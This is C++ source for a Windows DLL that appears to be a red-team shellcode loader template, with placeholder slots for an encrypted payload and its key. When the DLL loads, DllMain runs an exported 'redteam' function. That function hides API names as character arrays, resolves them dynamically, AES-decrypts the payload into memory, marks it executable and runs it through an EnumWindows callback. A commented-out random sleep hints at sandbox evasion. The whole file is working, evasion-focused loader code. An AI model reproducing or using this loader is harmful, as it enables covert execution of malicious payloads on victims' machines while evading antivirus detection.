
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <time.h>
using namespace std;

typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAlocationType, DWORD flProtect);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef HMODULE(WINAPI* pGetModuleHandle)(LPCSTR lpModuleName);
typedef VOID(WINAPI* pRtlMoveMemory)(VOID* destination, VOID* source, SIZE_T size);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef BOOL(WINAPI* pEnumWindows)(WNDENUMPROC lpEnumFunc, LPARAM lParam);
typedef HMODULE(WINAPI* pLoadLibrary)(LPCSTR lpLibFileName);

BYTE payload_key[] = { <<<PAYLOADKEY>>> };
BYTE payload[] = { <<<PAYLOAD>>> };

unsigned char kernel32_str[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char ntdll_str[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };
unsigned char user32_str[] = { 'u','s','e','r','3','2','.','d','l','l', 0x0 }; 
unsigned char virtualalloc_str[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0x0 }; 
unsigned char getprocaddress_str[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 }; 
unsigned char getmodulehandleA_str[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0x0};
unsigned char rtlmovememory_str[] = { 'R', 't', 'l', 'M', 'o', 'v', 'e', 'M', 'e', 'm', 'o', 'r', 'y', 0x0 };
unsigned char virtualprotect_str[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 };
unsigned char enumwindows_str[] = { 'E', 'n', 'u', 'm', 'W', 'i', 'n', 'd', 'o', 'w', 's', 0x00 };
unsigned char loadlibrary_str[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00};


void AESDecrypt(BYTE* payload, DWORD payload_len, BYTE* key, size_t keylen)
{
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
	CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
	CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
	CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len);

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
}

extern "C" {
	__declspec(dllexport) VOID WINAPI redteam(void) {

		LPVOID exec_mem;
		DWORD oldprotect = 0;

		pGetProcAddress cGetProcAddress = (pGetProcAddress)GetProcAddress(GetModuleHandleA((LPCSTR)kernel32_str), (LPCSTR)getprocaddress_str);

		pGetModuleHandle cGetModuleHandle = (pGetModuleHandle)cGetProcAddress(GetModuleHandleA((LPCSTR)kernel32_str), (LPCSTR)getmodulehandleA_str);

		pVirtualAlloc cVirtualAlloc = (pVirtualAlloc)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)virtualalloc_str);
		exec_mem = cVirtualAlloc(0, (size_t)sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		pRtlMoveMemory cRtlMoveMemory = (pRtlMoveMemory)cGetProcAddress(cGetModuleHandle((LPCSTR)ntdll_str), (LPCSTR)rtlmovememory_str);
		cRtlMoveMemory(exec_mem, payload, (size_t)sizeof(payload));

		AESDecrypt((LPBYTE)exec_mem, (size_t)sizeof(payload), payload_key, (size_t)sizeof(payload_key));

		pVirtualProtect cVirtualProtect = (pVirtualProtect)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)virtualprotect_str);
		cVirtualProtect(exec_mem, (size_t)sizeof(payload), PAGE_EXECUTE_READ, &oldprotect);

		pLoadLibrary cLoadLibrary = (pLoadLibrary)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)loadlibrary_str);
		cLoadLibrary((LPCSTR)user32_str);

		//int sleep_time = rand() % 30000 + 60000;
		//Sleep(sleep_time);

		pEnumWindows cEnumWindows = (pEnumWindows)cGetProcAddress(cGetModuleHandle((LPCSTR)user32_str), (LPCSTR)enumwindows_str);
		cEnumWindows((WNDENUMPROC)exec_mem, 0);
	}
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH: redteam();
	case DLL_THREAD_ATTACH: redteam();
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
